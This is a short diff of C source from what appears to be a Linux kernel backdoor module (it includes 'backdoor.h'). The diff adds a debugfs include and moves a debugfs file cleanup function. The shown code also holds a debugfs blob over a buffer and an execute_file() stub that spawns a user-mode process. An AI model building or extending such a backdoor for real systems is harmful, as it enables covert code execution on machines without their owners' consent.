@@ -1,3 +1,4 @@
+#include <linux/debugfs.h>
 #include "backdoor.h"
 
 extern unsigned char *buffer;
@@ -5,12 +6,6 @@ extern unsigned long buffer_length;
 
 struct dentry *dfs = NULL;
 struct debugfs_blob_wrapper *myblob = NULL;
-
-void destroy_file(void){
-	if (dfs){
-		debugfs_remove(dfs);
-	}
-}
 
 void execute_file(void){
 	struct subprocess_info *sub_info;
@@ -52,4 +47,10 @@ int create_file(void){
 		return -EINVAL;
 	}
 	return 0;
+}
+
+void destroy_file(void){
+	if (dfs){
+		debugfs_remove(dfs);
+	}
 }
